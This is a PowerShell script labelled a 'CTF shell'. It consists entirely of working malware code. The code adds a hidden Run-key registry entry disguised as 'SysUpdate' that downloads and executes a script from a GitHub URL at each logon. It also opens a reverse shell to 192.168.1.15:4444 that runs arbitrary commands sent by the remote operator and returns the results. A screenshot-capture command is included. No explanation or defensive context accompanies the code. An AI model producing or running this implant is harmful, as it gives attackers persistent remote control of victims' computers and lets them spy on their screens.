# --- FULL STABLE CTF SHELL (PHASE 2.1) ---

# 1. Setup Persistence (Registry)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate"
$payload = "powershell.exe -WindowStyle Hidden -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')"

if (-not (Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    New-ItemProperty -Path $regPath -Name $regName -Value $payload -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
}

# 2. Load Assemblies (Standard .NET only to avoid WinRT crashes)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# 3. Screenshot Function
function Get-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $base = [Convert]::ToBase64String($ms.ToArray())
        
        $graphics.Dispose(); $bitmap.Dispose(); $ms.Dispose()
        return $base
    } catch {
        return "Screenshot Error: $($_.Exception.Message)"
    }
}

# 4. Connection Details
$ip = '192.168.1.15'
$port = 4444

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    # Greeting
    $writer.WriteLine("--- Shell Connected: $($env:COMPUTERNAME) ---")
    $writer.Write("PS " + (Get-Location).Path + "> ")

    # 5. Main Loop
    while($client.Connected) {
        # Read raw line from Netcat
        $line = $reader.ReadLine()
        if ($null -eq $line) { break }
        
        # CLEAN THE INPUT (Crucial for matching 'screenshot')
        $input = $line.Trim()
        if ([string]::IsNullOrWhiteSpace($input)) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            continue
        }

        # Check for special commands before IEX
        if ($input -eq "exit") {
            break
        } 
        elseif ($input -eq "screenshot") {
            $output = Get-Screenshot
        } 
        else {
            # Run standard system command
            $output = try { 
                Invoke-Expression $input 2>&1 | Out-String 
            } catch { 
                $_.Exception.Message 
            }
        }

        # Send output back
        $writer.WriteLine($output)
        $writer.Write("PS " + (Get-Location).Path + "> ")
    }
} catch {
    # Fail quietly in production, but helpful for debugging CTFs
} finally {
    if ($client) { $client.Close() }
}
